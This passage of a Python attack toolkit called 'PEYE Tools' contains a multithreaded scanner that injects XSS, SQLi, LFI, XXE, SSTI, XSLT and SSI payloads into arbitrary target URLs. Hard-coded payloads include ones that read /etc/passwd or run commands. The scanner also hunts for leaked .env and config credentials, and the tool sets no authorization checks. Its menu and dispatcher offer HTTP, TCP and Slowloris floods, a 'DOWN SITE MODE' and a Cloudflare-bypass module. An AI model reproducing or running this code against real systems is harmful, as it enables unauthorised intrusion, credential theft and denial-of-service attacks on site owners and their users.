            f.write(f"PEYE Vulnerability Report\nTarget: {self.target}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*70}\n\n")
            for vuln in self.findings:
                f.write(f"[{vuln['type']}] {vuln['url']}\nPayload: {vuln['payload']}\nStatus: {vuln['status']}\n\n")
        print(f"{GREEN}[✓] Report saved to: {filename}{RESET}")

class AdvancedScanner:
    def __init__(self, target, session):
        self.target = target
        self.session = session
        self.wordlists = WordlistManager()
        self.results = defaultdict(list)
        self.report = VulnerabilityReport()
        self.report.target = target
        self.threads = 50
    
    def check_connection(self, url):
        try:
            resp = self.session.get(url, timeout=5)
            if resp.status_code == 200:
                return True, resp.status_code
            elif resp.status_code == 403:
                print(f"{RED}[✗] Access Denied (403 Forbidden){RESET}")
                return False, 403
            elif resp.status_code == 404:
                print(f"{RED}[✗] Not Found (404){RESET}")
                return False, 404
            else:
                return False, resp.status_code
        except:
            return False, None
    
    def vuln_scan(self, vuln_type, payloads, param='q', indicator=None, method='GET'):
        if not payloads:
            print(f"{YELLOW}[!] No {vuln_type} payloads loaded{RESET}")
            return []
        print(f"\n{CYAN}[*] Scanning {vuln_type}... (Total: {len(payloads)}){RESET}")
        connected, status = self.check_connection(self.target)
        if not connected:
            return []
        found = []
        total = len(payloads)
        
        def test_payload(payload):
            if method.upper() == 'GET':
                test_url = self.target + (('?' + param + '=' + quote(payload)) if '?' not in self.target else ('&' + param + '=' + quote(payload)))
                try:
                    resp = self.session.get(test_url, timeout=5)
                    if resp.status_code == 200 and indicator and indicator in resp.text:
                        return (payload, test_url, resp.status_code)
                except:
                    return None
            else:
                try:
                    resp = self.session.post(self.target, data={param: payload}, timeout=5)
                    if resp.status_code == 200 and indicator and indicator in resp.text:
                        return (payload, self.target, resp.status_code)
                except:
                    return None
            return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_payload, p): p for p in payloads}
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    payload, test_url, status_code = result
                    found.append(payload)
                    self.report.add(vuln_type, test_url, payload, f"HTTP {status_code}")
                    print(f"\n{RED}[!] {vuln_type} VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {test_url}")
                    print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
                    print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {status_code}{RESET}")
                if i % 50 == 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        print(f"\n{GREEN}[✓] {vuln_type} complete: {len(found)}/{total} found{RESET}")
        self.results[vuln_type] = found
        return found
    
    def scan_csrf(self):
        print(f"\n{CYAN}[*] Scanning CSRF...{RESET}")
        payloads = self.wordlists.get('csrf')
        found = []
        for payload in payloads:
            try:
                resp = self.session.get(self.target, timeout=5)
                if resp.status_code == 200 and payload in resp.text.lower():
                    print(f"{RED}[!] CSRF Possible: {self.target}{RESET}")
                    self.report.add("CSRF", self.target, payload, "Potential")
                    found.append(payload)
            except:
                pass
        print(f"{GREEN}[✓] CSRF complete: {len(found)} found{RESET}")
        return found
    
    def scan_cors(self):
        print(f"\n{CYAN}[*] Scanning CORS...{RESET}")
        origins = self.wordlists.get('cors')
        found = []
        for origin in origins:
            try:
                headers = {'Origin': origin}
                resp = self.session.get(self.target, headers=headers, timeout=5)
                if resp.headers.get('Access-Control-Allow-Origin') in [origin, '*']:
                    print(f"{RED}[!] CORS Misconfiguration: {origin}{RESET}")
                    self.report.add("CORS", self.target, origin, "Misconfigured")
                    found.append(origin)
            except:
                pass
        print(f"{GREEN}[✓] CORS complete: {len(found)} found{RESET}")
        return found
    
    def scan_clickjacking(self):
        print(f"\n{CYAN}[*] Scanning Clickjacking...{RESET}")
        try:
            resp = self.session.get(self.target, timeout=5)
            if resp.status_code == 200:
                if 'X-Frame-Options' not in resp.headers:
                    print(f"{RED}[!] Clickjacking Possible - No X-Frame-Options{RESET}")
                    self.report.add("Clickjacking", self.target, "", "Missing X-Frame-Options")
                elif resp.headers.get('X-Frame-Options') == 'ALLOWALL':
                    print(f"{RED}[!] Clickjacking Possible - X-Frame-Options: ALLOWALL{RESET}")
                    self.report.add("Clickjacking", self.target, "", "X-Frame-Options: ALLOWALL")
        except:
            pass
        print(f"{GREEN}[✓] Clickjacking complete{RESET}")
    
    def scan_opendir(self):
        print(f"\n{CYAN}[*] Scanning Open Directory...{RESET}")
        paths = self.wordlists.get('opendir')
        found = []
        for path in paths:
            url = urljoin(self.target, path)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200 and ('Index of' in resp.text or 'Parent Directory' in resp.text):
                    print(f"{RED}[!] Open Directory Found: {url}{RESET}")
                    self.report.add("Open Directory", url, "", "HTTP 200")
                    found.append(url)
            except:
                pass
        print(f"{GREEN}[✓] Open Directory complete: {len(found)} found{RESET}")
        return found
    
    def scan_backup(self):
        print(f"\n{CYAN}[*] Scanning Backup Files...{RESET}")
        files = self.wordlists.get('backup')
        found = []
        for file in files:
            url = urljoin(self.target, file)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    print(f"{RED}[!] Backup File Found: {url}{RESET}")
                    self.report.add("Backup File", url, "", "HTTP 200")
                    found.append(url)
            except:
                pass
        print(f"{GREEN}[✓] Backup complete: {len(found)} found{RESET}")
        return found
    
    def scan_config(self):
        print(f"\n{CYAN}[*] Scanning Config Files...{RESET}")
        files = self.wordlists.get('config')
        found = []
        for file in files:
            url = urljoin(self.target, file)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200 and ('password' in resp.text.lower() or 'api_key' in resp.text.lower()):
                    print(f"{RED}[!] Config File Found: {url}{RESET}")
                    self.report.add("Config File", url, "", "HTTP 200")
                    found.append(url)
            except:
                pass
        print(f"{GREEN}[✓] Config complete: {len(found)} found{RESET}")
        return found
    
    def scan_env(self):
        print(f"\n{CYAN}[*] Scanning .env Files...{RESET}")
        files = self.wordlists.get('env')
        found = []
        for file in files:
            url = urljoin(self.target, file)
            try:
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200 and ('DB_' in resp.text or 'APP_KEY' in resp.text or 'PASSWORD' in resp.text):
                    print(f"{RED}[!] .env File Found: {url}{RESET}")
                    self.report.add(".env File", url, "", "HTTP 200")
                    found.append(url)
            except:
                pass
        print(f"{GREEN}[✓] .env complete: {len(found)} found{RESET}")
        return found
    
    def dir_scan(self):
        dirs = self.wordlists.get('dirs')
        if not dirs:
            dirs = ['admin', 'login', 'wp-admin', 'administrator', 'cpanel', 'dashboard']
            print(f"{YELLOW}[!] No dirs.txt, using internal list{RESET}")
        print(f"\n{CYAN}[*] Directory Bruteforce... (Total: {len(dirs)}){RESET}")
        connected, status = self.check_connection(self.target)
        if not connected:
            return []
        found = []
        total = len(dirs)
        
        def check_dir(d):
            url = urljoin(self.target, d)
            try:
                resp = self.session.get(url, timeout=3, allow_redirects=False)
                if resp.status_code == 200:
                    return (url, resp.status_code)
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_dir, d): d for d in dirs}
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    url, code = result
                    found.append(url)
                    print(f"\n{GREEN}[✓] DIRECTORY FOUND!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
                    print(f"    {WHITE}Status:{RESET} {GREEN}HTTP {code}{RESET}")
                    self.report.add("Directory", url, "", f"HTTP {code}")
                if i % 50 == 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        print(f"\n{GREEN}[✓] Directory complete: {len(found)}/{total} found{RESET}")
        return found
    
    def subdomain_scan(self, domain):
        subs = self.wordlists.get('subdomains')
        if not subs:
            subs = ['www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'api', 'test']
            print(f"{YELLOW}[!] No subdomains.txt, using internal list{RESET}")
        print(f"\n{CYAN}[*] Subdomain Scan... (Total: {len(subs)}){RESET}")
        found = []
        total = len(subs)
        
        def check_sub(sub):
            url = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(url)
                return (url, ip)
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(check_sub, s): s for s in subs}
            for i, future in enumerate(as_completed(futures), 1):
                result = future.result()
                if result:
                    url, ip = result
                    found.append(url)
                    print(f"\n{GREEN}[✓] SUBDOMAIN FOUND!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
                    print(f"    {WHITE}IP:{RESET} {ip}")
                    self.report.add("Subdomain", url, "", f"IP: {ip}")
                if i % 50 == 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        print(f"\n{GREEN}[✓] Subdomain complete: {len(found)}/{total} found{RESET}")
        return found
    
    def bypass403_scan(self):
        payloads = self.wordlists.get('bypass403')
        if not payloads:
            payloads = ['/', '/%2e/', '/%2e%2e/', '/..;/']
            print(f"{YELLOW}[!] No bypass403.txt, using internal list{RESET}")
        print(f"\n{CYAN}[*] Scanning 403 Bypass... (Total: {len(payloads)}){RESET}")
        found = []
        
        def test_bypass(payload):
            headers = {'X-Forwarded-For': '127.0.0.1', 'X-Original-URL': payload, 'X-Rewrite-URL': payload}
            try:
                resp = self.session.get(self.target + payload, headers=headers, timeout=5)
                if resp.status_code == 200:
                    return (payload, self.target + payload, resp.status_code)
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_bypass, p): p for p in payloads}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    payload, url, code = result
                    found.append(payload)
                    self.report.add("403 Bypass", url, payload, f"HTTP {code}")
                    print(f"\n{GREEN}[✓] 403 BYPASS FOUND!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
                    print(f"    {WHITE}Technique:{RESET} {YELLOW}{payload}{RESET}")
        print(f"{GREEN}[✓] 403 Bypass complete: {len(found)} found{RESET}")
        return found
    
    def ssti_scan(self):
        payloads = self.wordlists.get('ssti')
        if not payloads:
            payloads = ['{{7*7}}', '${7*7}', '{{config}}']
            print(f"{YELLOW}[!] No ssti.txt, using internal list{RESET}")
        print(f"\n{CYAN}[*] Scanning SSTI... (Total: {len(payloads)}){RESET}")
        found = []
        
        def test_ssti(payload):
            test_url = self.target + (('?' + 'name' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'name' + '=' + quote(payload)))
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200 and ('{{' in resp.text or '}}' in resp.text):
                    return (payload, test_url, resp.status_code)
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_ssti, p): p for p in payloads}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    payload, url, code = result
                    found.append(payload)
                    self.report.add("SSTI", url, payload, f"HTTP {code}")
                    print(f"\n{RED}[!] SSTI VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
                    print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
        print(f"{GREEN}[✓] SSTI complete: {len(found)} found{RESET}")
        return found
    
    def xslt_scan(self):
        payloads = self.wordlists.get('xslt')
        if not payloads:
            payloads = ['<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document(\'/etc/passwd\')"/></xsl:template></xsl:stylesheet>']
            print(f"{YELLOW}[!] No xslt.txt, using internal list{RESET}")
        print(f"\n{CYAN}[*] Scanning XSLT Injection... (Total: {len(payloads)}){RESET}")
        found = []
        
        def test_xslt(payload):
            test_url = self.target + (('?' + 'xml' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'xml' + '=' + quote(payload)))
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200 and ('xsl:stylesheet' in resp.text or 'file://' in resp.text):
                    return (payload, test_url, resp.status_code)
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_xslt, p): p for p in payloads}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    payload, url, code = result
                    found.append(payload)
                    self.report.add("XSLT Injection", url, payload, f"HTTP {code}")
                    print(f"\n{RED}[!] XSLT INJECTION VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
        print(f"{GREEN}[✓] XSLT complete: {len(found)} found{RESET}")
        return found
    
    def ssi_esi_scan(self):
        payloads = self.wordlists.get('ssi_esi')
        if not payloads:
            payloads = ['<!--#exec cmd="ls" -->', '<!--#include file="../../etc/passwd"-->']
            print(f"{YELLOW}[!] No ssi_esi.txt, using internal list{RESET}")
        print(f"\n{CYAN}[*] Scanning SSI/ESI Injection... (Total: {len(payloads)}){RESET}")
        found = []
        
        def test_ssi(payload):
            test_url = self.target + (('?' + 'page' + '=' + quote(payload)) if '?' not in self.target else ('&' + 'page' + '=' + quote(payload)))
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200 and ('<!--#' in resp.text or 'root:' in resp.text):
                    return (payload, test_url, resp.status_code)
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_ssi, p): p for p in payloads}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    payload, url, code = result
                    found.append(payload)
                    self.report.add("SSI/ESI Injection", url, payload, f"HTTP {code}")
                    print(f"\n{RED}[!] SSI/ESI INJECTION VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {url}")
        print(f"{GREEN}[✓] SSI/ESI complete: {len(found)} found{RESET}")
        return found
    
    def full_scan(self):
        print(f"\n{MAGENTA}{'='*70}{RESET}")
        print(f"{YELLOW}[*] FULL SCAN: {self.target}{RESET}")
        print(f"{MAGENTA}{'='*70}{RESET}")
        
        connected, status = self.check_connection(self.target)
        if not connected:
            print(f"{RED}[✗] Target unreachable, aborting scan{RESET}")
            return
        
        self.vuln_scan('XSS', self.wordlists.get('xss'), 'q', '<script>')
        self.vuln_scan('SQLi', self.wordlists.get('sqli'), 'id', 'mysql|syntax')
        self.vuln_scan('LFI', self.wordlists.get('lfi'), 'file', 'root:')
        self.vuln_scan('XXE', self.wordlists.get('xxe'), 'xml', 'root:', method='POST')
        self.bypass403_scan()
        self.ssti_scan()
        self.xslt_scan()
        self.ssi_esi_scan()
        self.scan_csrf()
        self.scan_cors()
        self.scan_clickjacking()
        self.scan_opendir()
        self.scan_backup()
        self.scan_config()
        self.scan_env()
        self.dir_scan()
        
        print(f"\n{MAGENTA}{'='*70}{RESET}")
        print(f"{YELLOW}[*] SCAN SUMMARY{RESET}")
        print(f"{MAGENTA}{'='*70}{RESET}")
        total = 0
        for vuln, findings in self.results.items():
            if findings:
                print(f"{RED}[!] {vuln}: {len(findings)} vulnerabilities{RESET}")
                total += len(findings)
        if total == 0:
            print(f"{GREEN}[✓] No vulnerabilities detected{RESET}")
        self.report.display()
        print(f"{MAGENTA}{'='*70}{RESET}")
        return self.results

class IPInfo:
    def get_ip_info(self, target):
        print(f"{CYAN}[*] Getting IP information for {target}...{RESET}")
        try:
            ip = socket.gethostbyname(target)
            print(f"{GREEN}[✓] IP Address: {ip}{RESET}")
            try:
                geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
                if geo.get('status') == 'success':
                    print(f"{GREEN}[✓] Location: {geo.get('city')}, {geo.get('regionName')}, {geo.get('country')}{RESET}")
                    print(f"{GREEN}[✓] ISP: {geo.get('isp')}{RESET}")
            except:
                pass
            return ip
        except:
            print(f"{RED}[✗] Could not resolve IP{RESET}")
            return None

class PortScanner:
    def __init__(self):
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080, 8443]
    
    def scan(self, target, ports=None):
        print(f"{CYAN}[*] Scanning ports on {target}...{RESET}")
        ports = ports or self.common_ports
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                if sock.connect_ex((target, port)) == 0:
                    open_ports.append(port)
                    print(f"{GREEN}[✓] Port {port} OPEN{RESET}")
                sock.close()
            except:
                pass
        print(f"{GREEN}[✓] Found {len(open_ports)} open ports{RESET}")
        return open_ports

class CMSDetector:
    def __init__(self, target, session):
        self.target = target
        self.session = session
    
    def detect(self):
        print(f"{CYAN}[*] Detecting CMS...{RESET}")
        cms_list = {'WordPress': ['wp-content', 'wp-includes'], 'Joomla': ['joomla', 'com_content'], 'Laravel': ['laravel', 'csrf-token'], 'Drupal': ['drupal', 'sites/default']}
        try:
            resp = self.session.get(self.target, timeout=10)
            html = resp.text.lower()
            for cms, patterns in cms_list.items():
                for pattern in patterns:
                    if pattern.lower() in html:
                        print(f"{GREEN}[✓] CMS Detected: {cms}{RESET}")
                        return cms
            print(f"{YELLOW}[!] No CMS detected{RESET}")
            return None
        except:
            print(f"{RED}[✗] Could not detect CMS{RESET}")
            return None

class Peye:
    def __init__(self):
        self.use_proxy = True
        self.dork = DorkSearch()
        self.ipinfo = IPInfo()
        self.portscanner = PortScanner()
        self.saa_enabled = False
    
    def menu(self):
        proxy_status = "ON" if self.use_proxy else "OFF"
        saa_status = "ON" if self.saa_enabled else "OFF"
        print(f"""
{YELLOW}╔══════════════════════════════════════════════════════════════════╗
║ {GREEN} PEYE Tools v{VERSION} (Proxy: {proxy_status} | SAA: {saa_status}){RESET}{YELLOW}                                ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[📊 SCANNER - VULNERABILITY]{RESET}{YELLOW}                                          ║
║ {CYAN}[1] {WHITE}Full Vulnerability Scan                                                     ║
║ {CYAN}[2] {WHITE}XSS | SQLi | LFI | XXE | SSTI | XSLT | SSI/ESI                              ║
║ {CYAN}[3] {WHITE}CSRF | CORS | Clickjacking | OpenDir | Backup | Config | .env               ║
║ {CYAN}[4] {WHITE}Directory Bruteforce | Subdomain | 403 Bypass                               ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[🔍 DORK SEARCH]{RESET}{YELLOW}                                                    ║
║ {CYAN}[5] {WHITE}Search with Google Dork                                                     ║
║ {CYAN}[6] {WHITE}Search from dork.txt File                                                   ║
║ {CYAN}[7] {WHITE}Search by Technology                                                        ║
║ {CYAN}[8] {WHITE}Show Popular Dorks                                                         ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[🛠️ EXTRA TOOLS]{RESET}{YELLOW}                                                    ║
║ {CYAN}[9] {WHITE}IP Information & Geolocation                                               ║
║ {CYAN}[10] {WHITE}Port Scanner                                                              ║
║ {CYAN}[11] {WHITE}CMS Detector                                                              ║
║ {CYAN}[12] {WHITE}SSL/TLS Checker                                                           ║
║ {CYAN}[13] {WHITE}HTTP Header Analyzer                                                      ║
║ {CYAN}[14] {WHITE}Check for Updates                                                         ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[💥 DoS ATTACK - PYTHON]{RESET}{YELLOW}                                                       ║
║ {CYAN}[15] {WHITE}HTTP GET Flood          [16] {WHITE}HTTP POST Flood                             ║
║ {CYAN}[17] {WHITE}HTTP HEAD Flood         [18] {WHITE}HTTP RANDOM Flood                           ║
║ {CYAN}[19] {WHITE}Slowloris               [20] {WHITE}Cache Flood                                 ║
║ {CYAN}[21] {WHITE}TCP Flood               [22] {WHITE}Mixed Methods                               ║
║ {CYAN}[23] {WHITE}ALL ATTACKS             [24] {WHITE}DOWN SITE MODE                              ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[💥 DoS ATTACK - JS MODULES]{RESET}{YELLOW}                                                      ║
║ {CYAN}[25] {WHITE}HTTP/2 Flood (h2flood.js)                                                     ║
║ {CYAN}[26] {WHITE}CF Bypass (cf-proo.js)                                                        ║
║ {CYAN}[27] {WHITE}UAM Flood (uam.js)                                                            ║
║ {CYAN}[28] {WHITE}HTTP/2 Attack (http2.js)                                                      ║
║ {CYAN}[29] {WHITE}Generic Flood (flood.js)                                                      ║
║ {CYAN}[30] {WHITE}Slow Flood (s-flood.js)                                                       ║
║ {CYAN}[31] {WHITE}Slowloris+TCP (st-flood.js)                                                   ║
╠══════════════════════════════════════════════════════════════════╣
║ {CYAN}[S] {WHITE}Toggle SAA (Slash Agg Anoying) - Current: {saa_status}                              ║
║ {CYAN}[P] {WHITE}Toggle Proxy (Current: {proxy_status})                                            ║
║ {CYAN}[U] {WHITE}Check & Update                                                                  ║
║ {CYAN}[0] {WHITE}Exit                                                                           ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")
    
    def run(self):
        print_banner()
        
        while True:
            self.menu()
            choice = input(f"{GREEN}\n> {RESET}").upper()
            
            if choice == '0':
                sys.exit(0)
            
            if choice == 'P':
                self.use_proxy = not self.use_proxy
                print(f"{GREEN}[✓] Proxy: {'ON' if self.use_proxy else 'OFF'}{RESET}")
                time.sleep(1)
                os.system('clear')
                print_banner()
                continue
            
            if choice == 'S':
                self.saa_enabled = not self.saa_enabled
                print(f"{GREEN}[✓] SAA: {'ON' if self.saa_enabled else 'OFF'}{RESET}")
                time.sleep(1)
                os.system('clear')
                print_banner()
                continue
            
            if choice == 'U':
                check_update()
                input(f"\n{YELLOW}Enter to continue{RESET}")
                os.system('clear')
                print_banner()
                continue
            
            # Scanner options (1-4)
            if choice in ['1','2','3','4']:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                
                session = requests.Session()
                session.verify = False
                session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'})
                scanner = AdvancedScanner(target, session)
                
                connected, status = scanner.check_connection(target)
                if not connected:
                    if status == 403:
                        print(f"{RED}[✗] Access Denied (403) - Target blocking{RESET}")
                    else:
                        print(f"{RED}[✗] Cannot reach target{RESET}")
                    input(f"\n{YELLOW}Enter to continue{RESET}")
                    os.system('clear')
                    print_banner()
                    continue
                
                print(f"{GREEN}[✓] Connection OK (Status: {status}){RESET}")
                
                if choice == '1':
                    scanner.full_scan()
                elif choice == '2':
                    scanner.vuln_scan('XSS', scanner.wordlists.get('xss'), 'q', '<script>')
                    scanner.vuln_scan('SQLi', scanner.wordlists.get('sqli'), 'id', 'mysql|syntax')
                    scanner.vuln_scan('LFI', scanner.wordlists.get('lfi'), 'file', 'root:')
                    scanner.vuln_scan('XXE', scanner.wordlists.get('xxe'), 'xml', 'root:', method='POST')
                    scanner.ssti_scan()
                    scanner.xslt_scan()
                    scanner.ssi_esi_scan()
                    scanner.report.display()
                elif choice == '3':
                    scanner.scan_csrf()
                    scanner.scan_cors()
                    scanner.scan_clickjacking()
                    scanner.scan_opendir()
                    scanner.scan_backup()
                    scanner.scan_config()
                    scanner.scan_env()
                    scanner.report.display()
                elif choice == '4':
                    scanner.dir_scan()
                    domain = urlparse(target).netloc
                    scanner.subdomain_scan(domain)
                    scanner.bypass403_scan()
                    scanner.report.display()
            
            # Dork search options (5-8)
            elif choice in ['5','6','7']:
                target_url = input(f"{GREEN}Target URL/Domain: {RESET}").strip()
                self.dork.set_target(target_url)
                if choice == '5':
                    dork = input(f"{GREEN}Enter Google Dork: {RESET}")
                    self.dork.search_google(dork)
                elif choice == '6':
                    self.dork.search_from_file()
                elif choice == '7':
                    tech = input(f"{GREEN}Enter technology: {RESET}")
                    self.dork.tech_search(tech)
            elif choice == '8':
                self.dork.popular_dorks()
            
            # Extra Tools (9-14)
            elif choice == '9':
                target = input(f"{GREEN}Target (domain or IP): {RESET}").strip()
                self.ipinfo.get_ip_info(target)
            elif choice == '10':
                target = input(f"{GREEN}Target IP: {RESET}").strip()
                self.portscanner.scan(target)
            elif choice == '11':
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                session = requests.Session()
                session.verify = False
                detector = CMSDetector(target, session)
                detector.detect()
            elif choice == '12':
                target = input(f"{GREEN}Target (domain): {RESET}").strip()
                try:
                    ctx = ssl.create_default_context()
                    with ctx.wrap_socket(socket.socket(), server_hostname=target) as sock:
                        sock.connect((target, 443))
                        cert = sock.getpeercert()
                        print(f"{GREEN}[✓] SSL Certificate Info:{RESET}")
                        print(f"    Issuer: {cert.get('issuer', 'N/A')}")
                        print(f"    Subject: {cert.get('subject', 'N/A')}")
                        print(f"    Expiry: {cert.get('notAfter', 'N/A')}")
                except:
                    print(f"{RED}[✗] Could not get SSL info{RESET}")
            elif choice == '13':
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                try:
                    resp = requests.get(target, timeout=10, verify=False)
                    print(f"{GREEN}[✓] HTTP Headers:{RESET}")
                    for key, value in resp.headers.items():
                        print(f"    {key}: {value}")
                except:
                    print(f"{RED}[✗] Could not fetch headers{RESET}")
            elif choice == '14':
                check_update()
            
            # Python DoS Attacks (15-24)
            elif choice in [str(i) for i in range(15, 25)]:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                
                dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                thr = int(input(f"{YELLOW}Threads (100-5000): {RESET}"))
                dos = DoSAttack(target, self.use_proxy)
                if self.saa_enabled:
                    dos.enable_saa()
                
                attack_map = {
                    '15': dos.http_get, '16': dos.http_post, '17': dos.http_head,
                    '18': dos.http_random, '19': dos.slowloris, '20': dos.cache_flood,
                    '21': dos.tcp_flood, '22': dos.mixed_flood, '23': dos.all_attacks,
                    '24': dos.down_site
                }
                if choice in attack_map:
                    attack_map[choice](dur, min(thr, 5000))
            
            # JS Modules (25-31)
            elif choice in [str(i) for i in range(25, 32)]:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'https://' + target
                
                if choice == '25':
                    dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                    thr = int(input(f"{YELLOW}Threads: {RESET}"))
                    JSModuleCaller.run_h2flood(target, dur, thr)
                elif choice == '26':
                    cookie_count = int(input(f"{YELLOW}Cookie Count: {RESET}"))
                    timeout = int(input(f"{YELLOW}Timeout (ms): {RESET}"))
                    JSModuleCaller.run_cfbypass(target, cookie_count, timeout)
                elif choice == '27':
                    dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                    thr = int(input(f"{YELLOW}Threads: {RESET}"))
                    JSModuleCaller.run_uam(target, dur, thr)
                elif choice == '28':
                    dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                    thr = int(input(f"{YELLOW}Threads: {RESET}"))
                    JSModuleCaller.run_http2(target, dur, thr)
                elif choice == '29':
                    dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                    thr = int(input(f"{YELLOW}Threads: {RESET}"))
                    JSModuleCaller.run_flood(target, dur, thr)
                elif choice == '30':
                    dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                    thr = int(input(f"{YELLOW}Threads: {RESET}"))
                    JSModuleCaller.run_sflood(target, dur, thr)
                elif choice == '31':
                    dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                    thr = int(input(f"{YELLOW}Threads: {RESET}"))
                    JSModuleCaller.run_stflood(target, dur, thr)
            
            input(f"\n{YELLOW}Enter to continue{RESET}")
            os.system('clear')
            print_banner()

if __name__ == "__main__":
    peye = Peye()
    peye.run()
